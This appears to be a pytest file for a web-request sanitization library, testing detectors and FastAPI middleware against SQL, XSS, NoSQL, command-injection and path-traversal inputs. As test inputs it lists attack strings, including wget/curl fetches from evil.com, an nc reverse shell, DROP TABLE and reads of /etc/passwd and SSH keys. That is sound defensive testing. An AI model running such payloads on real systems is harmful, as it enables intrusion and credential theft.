"""Tests for the sanitization module."""

from collections.abc import AsyncGenerator

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient

from araxys.core.config import SanitizeConfig
from araxys.core.exceptions import SanitizationError
from araxys.sanitize.detectors import (
    detect_command_injection,
    detect_nosql_injection,
    detect_path_traversal,
)
from araxys.sanitize.filters import (
    detect_sqli,
    detect_xss,
    sanitize_payload,
    sanitize_value,
    strip_xss,
)
from araxys.sanitize.scanner import scan_value


class TestSQLiDetection:
    def test_detects_union_select(self) -> None:
        assert detect_sqli("1 UNION SELECT * FROM users") is not None

    def test_detects_drop_table(self) -> None:
        assert detect_sqli("'; DROP TABLE users --") is not None

    def test_detects_boolean_blind(self) -> None:
        assert detect_sqli("' OR 1=1 --") is not None

    def test_detects_sleep_injection(self) -> None:
        assert detect_sqli("1; SLEEP(5)") is not None

    def test_clean_input_passes(self) -> None:
        assert detect_sqli("Hello, my name is John") is None

    def test_clean_email_passes(self) -> None:
        assert detect_sqli("user@example.com") is None

    def test_clean_url_passes(self) -> None:
        assert detect_sqli("https://example.com/page?q=search") is None


class TestXSSDetection:
    def test_detects_script_tag(self) -> None:
        assert detect_xss("<script>alert('xss')</script>") is not None

    def test_detects_javascript_uri(self) -> None:
        assert detect_xss("javascript:alert(1)") is not None

    def test_detects_event_handler(self) -> None:
        assert detect_xss('<img onerror="alert(1)">') is not None

    def test_detects_iframe(self) -> None:
        assert detect_xss("<iframe src='evil.com'>") is not None

    def test_clean_input_passes(self) -> None:
        assert detect_xss("Hello, world!") is None

    def test_clean_html_entities_pass(self) -> None:
        assert detect_xss("&lt;script&gt;") is None


class TestStripXSS:
    def test_strips_script_tags(self) -> None:
        result = strip_xss("<script>alert('xss')</script>hello")
        assert "<script>" not in result
        assert "hello" in result

    def test_strips_all_tags(self) -> None:
        result = strip_xss("<b>bold</b> <i>italic</i>")
        assert result == "bold italic"

    def test_preserves_plain_text(self) -> None:
        result = strip_xss("just plain text")
        assert result == "just plain text"


class TestSanitizeValue:
    def test_blocks_sqli(self) -> None:
        with pytest.raises(SanitizationError, match="SQL Injection"):
            sanitize_value("1 UNION SELECT * FROM users")

    def test_strips_xss(self) -> None:
        result = sanitize_value("<script>alert(1)</script>safe text")
        assert "<script>" not in result
        assert "safe text" in result

    def test_clean_value_passes(self) -> None:
        result = sanitize_value("normal text")
        assert result == "normal text"


class TestSanitizePayload:
    def test_sanitizes_nested_dict(self) -> None:
        data = {
            "name": "John",
            "bio": "<script>alert(1)</script>Developer",
            "meta": {"description": "Safe content"},
        }
        result = sanitize_payload(data)
        assert "<script>" not in result["bio"]  # type: ignore
        assert result["name"] == "John"  # type: ignore

    def test_sanitizes_list(self) -> None:
        data = ["safe", "<script>alert(1)</script>unsafe"]
        result = sanitize_payload(data)
        assert "<script>" not in result[1]  # type: ignore

    def test_blocks_sqli_in_nested(self) -> None:
        data = {"query": {"filter": "1 UNION SELECT * FROM users"}}
        with pytest.raises(SanitizationError):
            sanitize_payload(data)

    def test_max_depth_exceeded(self) -> None:
        # Create deeply nested structure
        data: dict = {"a": None}  # type: ignore
        current = data
        for _ in range(15):
            current["a"] = {"a": None}
            current = current["a"]
        current["a"] = "value"

        with pytest.raises(SanitizationError, match="nesting depth"):
            sanitize_payload(data, max_depth=10)

    def test_preserves_non_string_types(self) -> None:
        data = {"count": 42, "active": True, "ratio": 3.14, "nothing": None}
        result = sanitize_payload(data)
        assert result == data


class TestNoSQLInjectionDetection:
    """Tests for NoSQL injection detection (Task 6.1)."""

    def test_detects_where_operator(self) -> None:
        assert detect_nosql_injection('{"$where": "sleep(5000)"}') is not None

    def test_detects_gt_operator(self) -> None:
        assert detect_nosql_injection('{"$gt": ""}') is not None

    def test_detects_ne_operator(self) -> None:
        assert detect_nosql_injection('username[$ne]=admin') is not None

    def test_detects_regex_operator(self) -> None:
        assert detect_nosql_injection('{"$regex": ".*"}') is not None

    def test_detects_nin_operator(self) -> None:
        assert detect_nosql_injection('{"$nin": ["a", "b"]}') is not None

    def test_detects_or_operator(self) -> None:
        assert detect_nosql_injection('{"$or": [{"$gt": ""}]}') is not None

    def test_detects_and_operator(self) -> None:
        assert detect_nosql_injection('{"$and": [{"$gt": ""}]}') is not None

    def test_detects_eq_operator(self) -> None:
        assert detect_nosql_injection('password[$eq]=secret') is not None

    def test_detects_prefixless_gt(self) -> None:
        assert detect_nosql_injection('{"gt": ""}') is not None

    def test_detects_prefixless_ne(self) -> None:
        assert detect_nosql_injection('{"ne": "admin"}') is not None

    def test_detects_prefixless_regex(self) -> None:
        assert detect_nosql_injection('{"regex": ".*"}') is not None

    def test_clean_string_passes(self) -> None:
        assert detect_nosql_injection("Hello, this is a normal message") is None

    def test_clean_json_passes(self) -> None:
        assert detect_nosql_injection('{"name": "John", "age": 30}') is None

    def test_clean_query_param_passes(self) -> None:
        assert detect_nosql_injection("username=john&age=30") is None

    def test_detects_nosql_in_url_encoded_value(self) -> None:
        assert detect_nosql_injection('user[$where]=1') is not None


class TestCommandInjectionDetection:
    """Tests for OS command injection detection (Task 6.2)."""

    def test_detects_semicolon_separator(self) -> None:
        assert detect_command_injection("1; ls -la") is not None

    def test_detects_pipe_operator(self) -> None:
        assert detect_command_injection("cat /etc/passwd | grep root") is not None

    def test_detects_double_pipe(self) -> None:
        assert detect_command_injection("rm file || echo done") is not None

    def test_detects_double_ampersand(self) -> None:
        assert detect_command_injection("rm file && echo done") is not None

    def test_detects_backtick_substitution(self) -> None:
        assert detect_command_injection("echo `whoami`") is not None

    def test_detects_dollar_paren_substitution(self) -> None:
        assert detect_command_injection("echo $(whoami)") is not None

    def test_detects_wget_command(self) -> None:
        assert detect_command_injection("wget http://evil.com/malware") is not None

    def test_detects_curl_command(self) -> None:
        assert detect_command_injection("curl http://evil.com") is not None

    def test_detects_bash_command(self) -> None:
        assert detect_command_injection("bash -c 'evil'") is not None

    def test_detects_nc_command(self) -> None:
        assert detect_command_injection("nc -e /bin/sh 10.0.0.1 4444") is not None

    def test_detects_url_encoded_semicolon(self) -> None:
        assert detect_command_injection("cmd%3Bls") is not None

    def test_detects_url_encoded_pipe(self) -> None:
        assert detect_command_injection("cmd%7Cls") is not None

    def test_detects_null_byte(self) -> None:
        assert detect_command_injection("cmd.exe\x00.exe") is not None

    def test_detects_powershell_command(self) -> None:
        assert detect_command_injection("powershell -Command Invoke-Expression") is not None  # noqa: E501

    def test_detects_cmd_exe(self) -> None:
        assert detect_command_injection("cmd /c dir") is not None

    def test_clean_text_passes(self) -> None:
        assert detect_command_injection("Hello, this is a normal message") is None

    def test_clean_url_passes(self) -> None:
        assert detect_command_injection("https://example.com/page?q=search") is None

    def test_clean_filename_passes(self) -> None:
        assert detect_command_injection("my_report_v2_final.pdf") is None


class TestPathTraversalDetection:
    """Tests for path traversal detection (Task 6.3)."""

    def test_detects_unix_dotdot_slash(self) -> None:
        assert detect_path_traversal("../../../etc/passwd") is not None

    def test_detects_windows_dotdot_backslash(self) -> None:
        assert detect_path_traversal("..\\..\\windows\\system32") is not None

    def test_detects_etc_passwd(self) -> None:
        assert detect_path_traversal("/etc/passwd") is not None

    def test_detects_var_log(self) -> None:
        assert detect_path_traversal("/var/log/auth.log") is not None

    def test_detects_url_encoded_traversal(self) -> None:
        assert detect_path_traversal("%2e%2e%2f%2e%2e%2fetc/passwd") is not None

    def test_detects_partial_url_encoded(self) -> None:
        assert detect_path_traversal("%2e%2e/etc/passwd") is not None

    def test_detects_mixed_encoding(self) -> None:
        assert detect_path_traversal("..%2f..%2fetc/passwd") is not None

    def test_detects_double_encoded(self) -> None:
        assert detect_path_traversal("%252e%252e%252fetc/passwd") is not None

    def test_detects_windows_drive_letter(self) -> None:
        assert detect_path_traversal("C:\\Windows\\system32") is not None

    def test_detects_unc_path(self) -> None:
        assert detect_path_traversal("\\\\server\\share\\file") is not None

    def test_detects_null_byte_path(self) -> None:
        assert detect_path_traversal("file.txt%00.html") is not None

    def test_clean_normal_path_passes(self) -> None:
        assert detect_path_traversal("/api/users/123/profile") is None

    def test_clean_filename_passes(self) -> None:
        assert detect_path_traversal("report_2024_final.pdf") is None

    def test_clean_query_string_passes(self) -> None:
        assert detect_path_traversal("page=1&limit=20") is None

    def test_detects_proc_path(self) -> None:
        assert detect_path_traversal("/proc/self/environ") is not None

    def test_detects_root_path(self) -> None:
        assert detect_path_traversal("/root/.ssh/id_rsa") is not None


# ---------------------------------------------------------------------------
# Fixtures for scanner + middleware integration
# ---------------------------------------------------------------------------


@pytest.fixture
def sanitize_config() -> SanitizeConfig:
    """SanitizeConfig with all new checks enabled."""
    return SanitizeConfig(
        block_sqli=False,
        strip_xss=False,
        scan_query_params=True,
        scan_headers=True,
        check_nosql_injection=True,
        check_command_injection=True,
        check_path_traversal=True,
    )


@pytest.fixture
def scanner_app(sanitize_config: SanitizeConfig) -> FastAPI:
    """FastAPI app with SanitizeMiddleware for integration testing."""
    from araxys.sanitize.middleware import SanitizeMiddleware

    app = FastAPI()

    @app.get("/test")
    async def test_get() -> dict[str, str]:
        return {"status": "ok"}

    @app.post("/body")
    async def test_post() -> dict[str, str]:
        return {"status": "ok"}

    app.add_middleware(SanitizeMiddleware, config=sanitize_config)
    return app


@pytest.fixture
async def scanner_client(scanner_app: FastAPI) -> AsyncGenerator[AsyncClient]:
    """Async HTTP client for scanner integration tests."""
    transport = ASGITransport(app=scanner_app)
    async with AsyncClient(transport=transport, base_url="http://test") as c:
        yield c


# ---------------------------------------------------------------------------
# Scanner Unit Tests (Tasks 6.4 + 6.5)
# ---------------------------------------------------------------------------


class TestScanValue:
    """Unit tests for scan_value() — applies all enabled detectors."""

    def test_detects_nosql(self) -> None:
        config = SanitizeConfig(
            check_nosql_injection=True,
            check_command_injection=False,
            check_path_traversal=False,
        )
        assert scan_value('{"$gt": ""}', config) is not None

    def test_detects_command_injection(self) -> None:
        config = SanitizeConfig(
            check_nosql_injection=False,
            check_command_injection=True,
            check_path_traversal=False,
        )
        assert scan_value("1; ls -la", config) is not None

    def test_detects_path_traversal(self) -> None:
        config = SanitizeConfig(
            check_nosql_injection=False,
            check_command_injection=False,
            check_path_traversal=True,
        )
        assert scan_value("../../../etc/passwd", config) is not None

    def test_skips_disabled_checks(self) -> None:
        config = SanitizeConfig(
            check_nosql_injection=False,
            check_command_injection=False,
            check_path_traversal=False,
        )
        assert scan_value("../../../etc/passwd", config) is None

    def test_url_decoded_values_are_scanned(self) -> None:
        config = SanitizeConfig(
            check_nosql_injection=True,
            check_command_injection=False,
            check_path_traversal=False,
        )
        assert scan_value("%7B%22%24gt%22%3A%20%22%22%7D", config) is not None

    def test_first_detector_wins(self) -> None:
        """When multiple checks enabled, the first matched threat is returned."""
        config = SanitizeConfig(
            check_nosql_injection=True,
            check_command_injection=True,
            check_path_traversal=True,
        )
        result = scan_value("../../../etc/passwd", config)
        assert result is not None
        # The order is: nosql → cmd → path_traversal
        # Path traversal should match here
        assert "traversal" in result or "traversal" in result


class TestScanQueryParams:
    """Tests for scan_query_params()."""

    async def test_clean_params_pass(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test?name=john&age=30")
        assert resp.status_code == 200

    async def test_detects_nosql_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test?username[$ne]=admin")
        assert resp.status_code == 400
        body = resp.json()
        assert "detail" in body

    async def test_detects_command_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test?cmd=1; ls -la")
        assert resp.status_code == 400

    async def test_detects_path_traversal_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test?file=../../../etc/passwd")
        assert resp.status_code == 400

    async def test_url_encoded_attack_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test?cmd=cmd%3Bls")
        assert resp.status_code == 400


class TestScanHeaders:
    """Tests for scan_headers()."""

    async def test_clean_headers_pass(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test", headers={"X-Custom": "hello"})
        assert resp.status_code == 200

    async def test_detects_nosql_in_header(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test", headers={"X-Auth": '{"$gt": ""}'})
        assert resp.status_code == 400

    async def test_detects_command_in_header(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get("/test", headers={"X-Cmd": "1; ls -la"})
        assert resp.status_code == 400

    async def test_detects_path_traversal_in_header(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
        resp = await scanner_client.get(
            "/test", headers={"X-File": "../../../etc/passwd"}
        )
        assert resp.status_code == 400

    async def test_disabled_scanner_does_not_block(self) -> None:
        config = SanitizeConfig(
            scan_query_params=False,
            scan_headers=False,
            check_nosql_injection=True,
        )
        from araxys.sanitize.middleware import SanitizeMiddleware

        app = FastAPI()

        @app.get("/test")
        async def root() -> dict[str, str]:
            return {"status": "ok"}

        app.add_middleware(SanitizeMiddleware, config=config)
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            resp = await c.get("/test?username[$ne]=admin")
            assert resp.status_code == 200


# ── v0.6 — JSON body full scan (Task 1.4) ──────────────────────────────────


class TestJSONBodyScan:
    """JSON body leaf strings are scanned for NoSQL/command/path-traversal."""

    @pytest.fixture
    def body_scan_config(self) -> SanitizeConfig:
        """Config with body scanning enabled but SQLi/XSS disabled for isolation."""
        return SanitizeConfig(
            block_sqli=False,
            strip_xss=False,
            check_nosql_injection=True,
            check_command_injection=True,
            check_path_traversal=True,
        )

    @pytest.fixture
    def body_scan_app(self, body_scan_config: SanitizeConfig) -> FastAPI:
        from araxys.sanitize.middleware import SanitizeMiddleware

        app = FastAPI()

        @app.post("/body")
        async def test_post() -> dict[str, str]:
            return {"status": "ok"}

        app.add_middleware(SanitizeMiddleware, config=body_scan_config)
        return app

    @pytest.fixture
    async def body_scan_client(
        self, body_scan_app: FastAPI
    ) -> AsyncGenerator[AsyncClient]:
        transport = ASGITransport(app=body_scan_app)
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            yield c

    async def test_nosql_in_json_body_blocked(
        self, body_scan_client: AsyncClient
    ) -> None:
        """NoSQL $where pattern in JSON body value returns 400."""
        resp = await body_scan_client.post(
            "/body", json={"query": '{"$where": "sleep(5000)"}'}
        )
        assert resp.status_code == 400

    async def test_command_injection_in_json_body_blocked(
        self, body_scan_client: AsyncClient
    ) -> None:
        """Command injection in JSON body value returns 400."""
        resp = await body_scan_client.post(
            "/body", json={"cmd": "; cat /etc/passwd"}
        )
        assert resp.status_code == 400

    async def test_path_traversal_in_json_body_blocked(
        self, body_scan_client: AsyncClient
    ) -> None:
        """Path traversal in JSON body value returns 400."""
        resp = await body_scan_client.post(
            "/body", json={"path": "../../etc/passwd"}
        )
        assert resp.status_code == 400

    async def test_nested_json_attack_blocked(
        self, body_scan_client: AsyncClient
    ) -> None:
        """Nested JSON with attack in deep value is blocked."""
        resp = await body_scan_client.post(
            "/body",
            json={
                "user": {
                    "profile": {
                        "bio": "../../../etc/shadow",
                    }
                }
            },
        )
        assert resp.status_code == 400

    async def test_clean_json_body_passes(
        self, body_scan_client: AsyncClient
    ) -> None:
        """Clean JSON body passes through."""
        resp = await body_scan_client.post(
            "/body", json={"username": "john", "age": 30}
        )
        assert resp.status_code == 200

    async def test_all_checks_disabled_clean_passes(self) -> None:
        """All scan flags disabled — clean request passes."""
        config = SanitizeConfig(
            block_sqli=False,
            strip_xss=False,
            check_nosql_injection=False,
            check_command_injection=False,
            check_path_traversal=False,
        )
        from araxys.sanitize.middleware import SanitizeMiddleware

        app = FastAPI()

        @app.post("/body")
        async def test_post() -> dict[str, str]:
            return {"status": "ok"}

        app.add_middleware(SanitizeMiddleware, config=config)
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            resp = await c.post(
                "/body", json={"username": "john"}
            )
            assert resp.status_code == 200

    async def test_all_checks_disabled_attack_passes(self) -> None:
        """All scan flags disabled — attack payload passes through."""
        config = SanitizeConfig(
            block_sqli=False,
            strip_xss=False,
            check_nosql_injection=False,
            check_command_injection=False,
            check_path_traversal=False,
        )
        from araxys.sanitize.middleware import SanitizeMiddleware

        app = FastAPI()

        @app.post("/body")
        async def test_post() -> dict[str, str]:
            return {"status": "ok"}

        app.add_middleware(SanitizeMiddleware, config=config)
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            resp = await c.post(
                "/body", json={"cmd": "; cat /etc/passwd"}
            )
            assert resp.status_code == 200


# ── v0.7 — Body Size Limit (Task 2.1) ────────────────────────────────────────


class TestBodySizeLimit:
    """Tests for body size limit enforcement in SanitizeMiddleware."""

    SMALL_LIMIT = 1_000  # 1KB limit for testing
    OVERSIZED = 2_000  # 2KB body

    @pytest.fixture
    def body_limit_config(self) -> SanitizeConfig:
        return SanitizeConfig(
            max_body_bytes=self.SMALL_LIMIT,
            block_sqli=False,
            strip_xss=False,
        )

    @pytest.fixture
    def body_limit_app(self, body_limit_config: SanitizeConfig) -> FastAPI:
        from araxys.sanitize.middleware import SanitizeMiddleware

        app = FastAPI()

        @app.post("/body")
        async def test_post() -> dict[str, str]:
            return {"status": "ok"}

        app.add_middleware(SanitizeMiddleware, config=body_limit_config)
        return app

    @pytest.fixture
    async def body_limit_client(
        self, body_limit_app: FastAPI
    ) -> AsyncGenerator[AsyncClient]:
        transport = ASGITransport(app=body_limit_app)
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            yield c

    async def test_oversized_body_rejected(
        self, body_limit_client: AsyncClient
    ) -> None:
        """POST with Content-Length > max_body_bytes returns 413."""
        large_body = "x" * self.OVERSIZED
        resp = await body_limit_client.post(
            "/body",
            content=large_body.encode(),
            headers={"content-type": "application/json"},
        )
        assert resp.status_code == 413
        assert resp.json() == {"detail": "Request body too large"}

    async def test_oversized_body_no_header_rejected(
        self, body_limit_app: FastAPI
    ) -> None:
        """POST without Content-Length header but body too large returns 413."""
        from araxys.sanitize.middleware import SanitizeMiddleware

        body = b"x" * self.OVERSIZED

        # Build a raw ASGI scope WITHOUT content-length header
        scope: dict[str, object] = {
            "type": "http",
            "method": "POST",
            "path": "/body",
            "headers": [
                (b"content-type", b"application/json"),
            ],
            "scheme": "http",
            "server": ("test", 80),
            "raw_path": b"/body",
            "query_string": b"",
            "client": ("127.0.0.1", 12345),
        }

        async def receive() -> dict[str, object]:
            return {"type": "http.request", "body": body, "more_body": False}

        async def send(_message: object) -> None:
            pass  # We capture via the middleware response

        middleware = SanitizeMiddleware(body_limit_app, config=SanitizeConfig(
            max_body_bytes=self.SMALL_LIMIT,
            block_sqli=False,
            strip_xss=False,
        ))

        from starlette.responses import JSONResponse

        response = await middleware.dispatch(
            await _make_request(scope, receive),  # type: ignore[arg-type]
            lambda _req: body_limit_app(scope, receive, send),  # type: ignore[arg-type,return-value]
        )
        assert isinstance(response, JSONResponse)
        assert response.status_code == 413
        assert response.body  # non-empty

    async def test_under_limit_passes(self, body_limit_client: AsyncClient) -> None:
        """POST with body under max_body_bytes passes through."""
        resp = await body_limit_client.post(
            "/body", json={"hello": "world"}
        )
        assert resp.status_code == 200


async def _make_request(
    scope: dict[str, object],
    receive: object,
) -> object:
    """Build a starlette Request from raw ASGI scope/receive."""
    from starlette.requests import Request

    return Request(scope=scope, receive=receive)  # type: ignore[arg-type]
